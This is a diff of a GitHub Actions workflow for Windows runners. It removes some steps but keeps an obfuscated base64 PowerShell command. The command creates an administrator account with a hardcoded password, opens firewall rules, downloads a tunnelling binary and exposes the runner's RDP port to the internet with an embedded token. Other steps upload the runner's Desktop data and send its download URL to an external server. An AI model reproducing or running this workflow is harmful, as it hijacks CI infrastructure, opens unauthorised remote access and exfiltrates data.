@@ -11,44 +11,22 @@ jobs:
     steps:
       # Step 1: Checkout repository
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v3
 
-      # Step 2: Create Admin User
-      - name: Create Admin User
-        run: |
-          net user administrator OLDUSER#6 /add
-          net localgroup administrators administrator /add
-          echo User 'administrator' created with administrative privileges.
-        shell: cmd
-
-      # Step 3: Get artifact URL from external server
-      - name: Get artifact URL
-        id: get_url
-        run: |
-          python -c "import urllib.request, json; print(json.load(urllib.request.urlopen('https://azcaptchahh.pythonanywhere.com/geturl'))['url'])"
-        shell: cmd
-
-      # Step 4: Download artifact
-      - name: Download artifact
-        uses: actions/download-artifact@v4
-        with:
-          name: data
-          path: C:\Users\administrator
-
-      # Step 5: Init and Tunnel
+      # Step 2: Init and Tunnel
       - name: Init and Tunnel
         shell: pwsh
-        timeout-minutes: 340
+        timeout-minutes: 340   # limit to 2 minutes
         run: |
           powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwAQwB1AHMAdABvAG0ATgBvAGQAZQAiACAALQBOAGEAbQBlACAAIgBBAGwAbABvAHcAQwBvAG4AbgAiACAALQBWAGEAbAB1AGUAIAAwAAoARQBuAGEAYgBsAGUALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBHAHIAbwB1AHAAIAAiAEYAaQBsAGUAIABhAG4AZAAgAFAAcgBpAG4AdABlAHIAIABTAGgAYQByAGkAbgBnACIACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABDAHUAcwB0AG8AbQBOAG8AZABlAFwAQQBjAGMAZQBzAHMAIgAgAC0ATgBhAG0AZQAgACIAQQB1AHQAaABNAG8AZABlACIAIAAtAFYAYQBsAHUAZQAgADEACgAKACMAIABDAHIAZQBhAHQAZQAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABhAGMAYwBvAHUAbgB0ACAAdwBpAHQAaAAgAGcAaQB2AGUAbgAgAHAAYQBzAHMAdwBvAHIAZAAKAG4AZQB0ACAAdQBzAGUAcgAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABPAEwARABVAFMARQBSACMANgAgAC8AYQBkAGQACgBuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAALwBhAGQAZAAKAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGIAaQBuAGEAcgB5ACAAYQBuAGQAIABzAHQAYQByAHQAIAB0AHUAbgBuAGUAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBzADMALgBhAHAALQBzAG8AdQB0AGgALQAxAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAHAAdQBiAGwAaQBjAC4AcABpAG4AZwBnAHkALgBiAGkAbgBhAHIAaQBlAHMALwBjAGwAaQAvAHYAMAAuADIALgA1AC8AdwBpAG4AZABvAHcAcwAvAGEAbQBkADYANAAvAHAAaQBuAGcAZwB5AC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAcABpAG4AZwBnAHkALgBlAHgAZQAiAAoALgBcAHAAaQBuAGcAZwB5AC4AZQB4AGUAIAAtAC0AdABvAGsAZQBuACAASwA0AHIAZABOAEwAWgBUAFEAZQA5ACAALQAtAHQAeQBwAGUAIAB0AGMAcAAgAC0AbAAgADMAMwA4ADkA
-  
-      # Step 6: List Desktop Data contents
+
+      # Step 3: List Desktop Data contents
       - name: List Desktop Data contents
         shell: cmd
         run: dir "C:\Users\Administrator\Desktop\data"
         continue-on-error: true
 
-      # Step 7: Upload Desktop Data as "data" artifact
+      # Step 4: Upload Desktop Data as artifact (always run)
       - name: Upload Desktop Data as "data" artifact
         if: always()
         uses: actions/upload-artifact@v4
@@ -56,7 +34,7 @@ jobs:
           name: data
           path: "C:/Users/Administrator/Desktop/data"
 
-      # Step 8: Get artifact URL via GitHub API (curl + jq)
+      # Step 5: Get artifact URL via GitHub API (curl + jq)
       - name: Get artifact URL
         if: always()
         id: get_artifact
@@ -73,6 +51,7 @@ jobs:
 
           echo "Artifacts JSON: $response"
 
+          # Get first artifact id
           artifact_id=$(echo "$response" | jq -r '.artifacts[0].id')
 
           echo "Got artifact id: $artifact_id"
@@ -80,7 +59,7 @@ jobs:
 
           echo "artifact_url=$artifact_url" >> $GITHUB_OUTPUT
 
-      # Step 9: Send artifact download URL to external server
+      # Step 6: Send artifact download URL to external server (always run)
       - name: Send artifact download URL to external server
         if: always()
         env:
